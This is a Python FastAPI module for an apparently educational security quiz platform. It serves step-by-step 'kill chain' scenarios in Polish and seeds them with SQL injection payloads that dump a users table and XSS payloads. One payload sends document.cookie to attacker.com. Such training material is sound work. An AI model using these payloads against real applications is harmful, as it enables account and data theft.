import json
import logging
from datetime import datetime
from fastapi import APIRouter, Depends, HTTPException, BackgroundTasks
from sqlalchemy.orm import Session
from pydantic import BaseModel
from database import get_db
from models.attack_scenario import AttackScenario, UserAttackProgress
from models.user import User
from services.achievement_service import check_and_award_achievements

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/api/attack", tags=["attack"])


class SubmitAnswerRequest(BaseModel):
    user_id: int
    answer: str


@router.get("/scenarios")
def list_scenarios(db: Session = Depends(get_db)):
    """List all active attack scenarios (without steps)."""
    scenarios = db.query(AttackScenario).filter(AttackScenario.is_active == True).order_by(AttackScenario.id).all()
    return [
        {
            "id": s.id,
            "title": s.title,
            "description": s.description,
            "total_steps": len(json.loads(s.steps_data)),
        }
        for s in scenarios
    ]


@router.get("/scenarios/{scenario_id}")
def get_scenario(scenario_id: int, db: Session = Depends(get_db)):
    """Get scenario details incl. all steps (but not expected answers)."""
    scenario = db.query(AttackScenario).filter(AttackScenario.id == scenario_id, AttackScenario.is_active == True).first()
    if not scenario:
        raise HTTPException(status_code=404, detail="Scenario not found")
    steps = json.loads(scenario.steps_data)
    # Don't send expected answers yet
    safe_steps = [{"step": s["step"], "question": s["question"]} for s in steps]
    return {
        "id": scenario.id,
        "title": scenario.title,
        "description": scenario.description,
        "steps": safe_steps,
    }


@router.get("/scenarios/{scenario_id}/current")
def get_current_step(scenario_id: int, user_id: int, db: Session = Depends(get_db)):
    """Get current step for a user."""
    scenario = db.query(AttackScenario).filter(AttackScenario.id == scenario_id, AttackScenario.is_active == True).first()
    if not scenario:
        raise HTTPException(status_code=404, detail="Scenario not found")

    progress = db.query(UserAttackProgress).filter(
        UserAttackProgress.user_id == user_id,
        UserAttackProgress.scenario_id == scenario_id
    ).first()
    if not progress:
        raise HTTPException(status_code=400, detail="Start scenario first")

    steps = json.loads(scenario.steps_data)
    total_steps = len(steps)

    if progress.completed or progress.current_step >= total_steps:
        progress.completed = True
        progress.completed_at = datetime.utcnow()
        db.commit()
        return {"completed": True, "total_points": progress.total_points_earned}

    current = steps[progress.current_step]
    return {
        "current_step": progress.current_step + 1,
        "total_steps": total_steps,
        "question": current["question"],
        "points_available": current["points"]
    }


@router.post("/scenarios/{scenario_id}/start")
def start_scenario(scenario_id: int, user_id: int, db: Session = Depends(get_db)):
    """Initialize or reset progress for a user."""
    scenario = db.query(AttackScenario).filter(AttackScenario.id == scenario_id, AttackScenario.is_active == True).first()
    if not scenario:
        raise HTTPException(status_code=404, detail="Scenario not found")

    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    progress = db.query(UserAttackProgress).filter(
        UserAttackProgress.user_id == user_id,
        UserAttackProgress.scenario_id == scenario_id
    ).first()
    steps = json.loads(scenario.steps_data)
    total_steps = len(steps)

    if not progress:
        progress = UserAttackProgress(
            user_id=user_id,
            scenario_id=scenario_id,
            current_step=0,
            completed=False,
            total_points_earned=0,
        )
        db.add(progress)
    else:
        # reset? No, allow continuing. For reset, client would delete and recreate.
        pass
    db.commit()
    db.refresh(progress)

    # Return current step data (question) or done
    if progress.completed:
        return {
            "completed": True,
            "total_points": progress.total_points_earned,
            "message": "Scenario already completed"
        }

    if progress.current_step < total_steps:
        current = steps[progress.current_step]
        return {
            "current_step": progress.current_step + 1,
            "total_steps": total_steps,
            "question": current["question"],
            "points_available": current["points"]
        }
    else:
        # Should not happen, but mark complete
        progress.completed = True
        progress.completed_at = datetime.utcnow()
        db.commit()
        return {"completed": True, "total_points": progress.total_points_earned}


@router.post("/scenarios/{scenario_id}/submit")
def submit_step_answer(scenario_id: int, req: SubmitAnswerRequest, db: Session = Depends(get_db)):
    """Submit answer for current step. If correct, advance and award points."""
    scenario = db.query(AttackScenario).filter(AttackScenario.id == scenario_id, AttackScenario.is_active == True).first()
    if not scenario:
        raise HTTPException(status_code=404, detail="Scenario not found")

    user = db.query(User).filter(User.id == req.user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    progress = db.query(UserAttackProgress).filter(
        UserAttackProgress.user_id == req.user_id,
        UserAttackProgress.scenario_id == scenario_id
    ).first()
    if not progress:
        raise HTTPException(status_code=400, detail="Start scenario first")

    if progress.completed:
        raise HTTPException(status_code=400, detail="Scenario already completed")

    steps = json.loads(scenario.steps_data)
    total_steps = len(steps)
    if progress.current_step >= total_steps:
        progress.completed = True
        progress.completed_at = datetime.utcnow()
        db.commit()
        return {"completed": True, "total_points": progress.total_points_earned}

    current = steps[progress.current_step]
    correct = current["expected_answer"].strip()
    user_ans = req.answer.strip()

    is_correct = user_ans == correct
    feedback = current["explanation"] if is_correct else "Niepoprawna odpowiedź. Spróbuj ponownie."

    if is_correct:
        # Award points and advance
        progress.total_points_earned += current["points"]
        user.total_xp += current["points"]
        progress.current_step += 1
        progress.last_attempt_at = datetime.utcnow()
        if progress.current_step >= total_steps:
            progress.completed = True
            progress.completed_at = datetime.utcnow()
        db.commit()

        # Check achievements
        new_achievements = check_and_award_achievements(user, db)

        return {
            "correct": True,
            "feedback": feedback,
            "points_earned": current["points"],
            "total_points": progress.total_points_earned,
            "total_xp": user.total_xp,
            "new_achievements": new_achievements,
            "step_completed": progress.current_step,
            "completed": progress.completed,
        }
    else:
        db.commit()  # just update last_attempt? not needed
        return {
            "correct": False,
            "feedback": feedback,
            "points_earned": 0,
        }


def seed_sample_scenarios(db: Session):
    """Seed Attack Scenarios."""
    samples = [
        {
            "title": "Kill Chain: SQL Injection",
            "description": "Przejdź przez pełny kill chain ataku SQL Injection na przykładowową aplikację.",
            "steps": [
                {
                    "step": 1,
                    "question": "Jaki payload możesz użyć do sprawdzenia czy aplikacja jest podatna na SQLi (boolean-based)?",
                    "expected_answer": "1' OR '1'='1",
                    "explanation": "Payload '1' OR '1'='1' zawsze jest prawdziwy, zmienia logikę zapytania.",
                    "points": 50
                },
                {
                    "step": 2,
                "question": "Po potwierdzeniu podatności, jak użyć UNION-based aby wyświetlić nazwę bazy danych?",
                    "expected_answer": "UNION SELECT database()",
                    "explanation": "database() zwraca bieżącą nazwę bazy.",
                    "points": 75
                },
                {
                    "step": 3,
                    "question": "Jak wyświetlić tabele w bieżącej bazie? (podaj pełne zapytanie)",
                    "expected_answer": "UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
                    "explanation": "information_schema.tables zawiera listę tabel.",
                    "points": 100
                },
                {
                    "step": 4,
                    "question": "Ostatecznie, jak wyciekać dane użytkowników (username i password)?",
                    "expected_answer": "UNION SELECT username, password FROM users",
                    "explanation": "Załóżmy że tabela users zawiera pola username i password.",
                    "points": 150
                }
            ]
        },
        {
            "title": "Kill Chain: XSS",
            "description": "Przejdź przez atak Cross-Site Scripting, od wykrycia do exfiltracji.",
            "steps": [
                {
                    "step": 1,
                    "question": "Jaki prosty payload możesz wysłać w polu wyszukiwania, aby sprawdzić reflected XSS?",
                    "expected_answer": "<script>alert(1)</script>",
                    "explanation": "Klasyczny payload; jeśli pojawia się alert, XSS istnieje.",
                    "points": 50
                },
                {
                    "step": 2,
                    "question": "Jak ukraść cookie użytkownika, jeśli nie ma HttpOnly?",
                    "expected_answer": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
                    "explanation": "Wysłanie cookie do własnego serwera.",
                    "points": 100
                },
                {
                    "step": 3,
                    "question": "Jakbyś ominął filter usuwający <script>?",
                    "expected_answer": "<img src=x onerror=alert(1)>",
                    "explanation": "Użycie innego tagu z atrybutem onerror.",
                    "points": 100
                }
            ]
        }
    ]

    added = 0
    for sdata in samples:
        existing = db.query(AttackScenario).filter(AttackScenario.title == sdata["title"]).first()
        if not existing:
            scen = AttackScenario(
                title=sdata["title"],
                description=sdata["description"],
                steps_data=json.dumps(sdata["steps"]),
                is_active=True,
            )
            db.add(scen)
            added += 1
    if added:
        db.commit()
        logger.info(f"Seeded {added} attack scenarios")
